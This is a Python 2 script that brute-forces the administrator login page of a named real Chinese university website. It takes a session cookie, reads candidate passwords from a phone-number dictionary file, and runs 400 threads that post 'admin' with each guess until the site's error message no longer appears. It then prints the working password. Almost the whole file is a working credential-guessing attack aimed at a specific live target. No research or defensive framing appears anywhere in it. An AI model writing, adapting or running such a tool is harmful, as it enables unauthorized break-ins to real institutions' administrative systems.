# -*- coding: gbk -*-
__author__ = 'bowman'
import urllib2
import re
import urllib
import threading
import Queue
import time
import thread
import cPickle

def get_page():
    req1 = urllib2.Request('http://tw.heuet.edu.cn/admin/login.asp')
    response = urllib2.urlopen(req1)
    cookie = response.headers.get('Set-Cookie')
    body = response.read(2081)
    #print body[-4:],'cookie',cookie
    return {'cookie':cookie,'cha':body[-4:]}

def test_pass(cookie, password):
    post_dict = {'username': 'admin', 'password': password, 'otherpwd': 1234,'reotherpwd':1234,'action':'true','position':1}
    params = urllib.urlencode(post_dict)
    #print 'params',params
    req2 = urllib2.Request('http://tw.heuet.edu.cn/admin/login.asp',params)
    req2.add_header('cookie',cookie)
    response = urllib2.urlopen(req2)
    #print response.read()
    ret = response.read().find(pass_invalid_str)

    if ret >0:
        return ""
    else:
        return str(password)

#consants
cookie_c = get_page()['cookie']
pass_invalid_str = \
                 r'<div align="center"><font color=#FF0000><b>用户名或者用户密码错误，请重新输入！</b>'
valid_pass = ''
workerLock = True
class worker(threading.Thread):

    def __init__(self,queue):
        print 'work is initing'
        threading.Thread.__init__(self)
        self.queue = queue
    def run(self):
        global workerLock
        global count
        print 'worker works in progress'
        global valid_pass
        while workerLock:

            password = self.queue.get()
            try:
                ret = test_pass(cookie_c,password)
            except urllib2.URLError:
                print 'worker failed'
                self.queue.put(password)
                self.queue.task_done()
                return
            if ret != '':
                valid_pass = ret
                print 'pass is',password
                workerLock = False
            count += 1
            if count % 200 == 0:
                print count
            self.queue.task_done()
queue_size = 1000
bulksize = 200
count = 0
queue = Queue.Queue()
def feeder(start=10000):
    global queue
    print 'in feeder'
    f = open('phonedic.txt','r')
    lines = f.readlines()[:1000]
    for line in lines:
        try:
            queue.put(line)
        except Queue.Full:
            print 'queue full,sleeping ZzZz'
    print 'feeder loaded'
    thread.exit_thread()
progress = 0
def runner(start=60000):
    #emit a new thread to feed the queue
    #thread.start_new_thread(feeder, (0,))
    #time.sleep(10)
    f = open('phonedic.txt')

    #fs = open('queuedump','r')
    #skip former lines
    for i in range(start):
        f.readline()
    #put pass dic in the queue
    lines =f.readlines()
    print 'left ',len(lines)

    for line in lines:
        queue.put(line)
    print 'added in queue'
    for i in range(400):
        t = worker(queue)
        t.setDaemon(True)
        t.start()

    
    queue.join()
    print 'finished'


if __name__ == '__main__':
    print 'let`s rock'
    try:
        runner(1800)
    except KeyboardInterrupt:
        fout = open('progress','w')
        print 'progress\n%s\nvalid_pass\n%s\n'%(progress,valid_pass)
        cPickle.dump(progress,fout)
        cPickle.dump(valid_pass)
        fout.close()
        print 'user shutdown, progress saved'
